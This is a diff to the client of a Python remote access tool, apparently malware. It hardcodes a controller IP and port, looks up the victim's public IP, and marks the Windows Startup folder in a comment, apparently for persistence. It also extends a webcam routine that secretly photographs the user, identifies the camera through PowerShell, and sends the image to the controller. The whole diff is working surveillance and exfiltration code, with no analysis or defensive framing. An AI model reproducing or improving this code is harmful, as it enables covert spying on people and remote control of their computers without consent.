@@ -2,7 +2,7 @@ import socket, subprocess, os, time, platform, sys, pyscreeze, urllib.request, c
 from io import StringIO
 
 # Socket Properties
-HOST = ""
+HOST = "192.168.2.26"
 PORT = 3000
 
 # Defines (Send & Recv) Functions for use
@@ -17,6 +17,8 @@ try:
     Public_IP = urllib.request.urlopen("https://ident.me", timeout=30).read()
 except (urllib.error.URLError, Exception):
     Public_IP = b"unknown"
+
+# C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
 
 def main():
     global objSocket
@@ -82,7 +84,13 @@ def Webcam():
         cv2.imwrite(appdata+"/webcam.png", image)
         del(webcam); send(b"success")
 
-        send(str(os.path.getsize(appdata+"/webcam.png")).encode())
+        try:
+            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"], shell=True, timeout=8)
+            Webcam_Name = result.split(b"Name=")[1].split(b"}")[0].decode()
+        except:
+            Webcam_Name = "Not Found"
+
+        send(str(os.path.getsize(appdata+"/webcam.png")).encode()); time.sleep(0.2); send(Webcam_Name.encode()); time.sleep(0.2)
         with open(appdata+"/webcam.png", "rb") as ImageFile:
             send(ImageFile.read())
 
